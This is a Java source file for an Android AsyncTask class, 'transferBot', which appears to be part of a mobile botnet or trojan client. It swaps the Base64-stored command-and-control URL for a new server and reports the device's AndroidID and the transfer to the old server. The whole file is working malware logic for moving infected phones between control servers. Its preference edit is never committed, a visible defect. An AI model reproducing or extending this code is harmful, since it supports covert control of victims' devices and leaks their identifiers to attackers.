package com.asynctask;

import android.os.AsyncTask;
import android.preference.PreferenceManager;
import android.util.Base64;

import com.connect.MyApplication;
import com.utils.CommonUtils;

import java.io.UnsupportedEncodingException;

/**
 * Created by Conan0xf on 2017/12/5.
 */

public class transferBot extends AsyncTask<String, Void, String> {
    String i = "";

    public transferBot(String i) {
        this.i = i;
    }

    @Override
    protected String doInBackground(String... params) {
        String URL = new String(Base64.decode(PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("URL", ""), Base64.DEFAULT));
        String oldURL = URL;

        PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).edit().putString("URL", Base64.encodeToString(i.getBytes(), Base64.DEFAULT));
        URL = i;

        try {
            CommonUtils.getInputStreamFromUrl(oldURL + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("urlPost", "") + "UID=" + PreferenceManager.getDefaultSharedPreferences(MyApplication.getContext()).getString("AndroidID", "") + "&Data=", "Bot Transfered To: " + i);
        } catch (UnsupportedEncodingException e) {
            e.printStackTrace();
        }
        return "Executed";
    }

    @Override
    protected void onPostExecute(String result) {/*httpcalldone*/}

    @Override
    protected void onPreExecute() {/*httpcallexecuting*/}

    @Override
    protected void onProgressUpdate(Void... values) {
    }
}
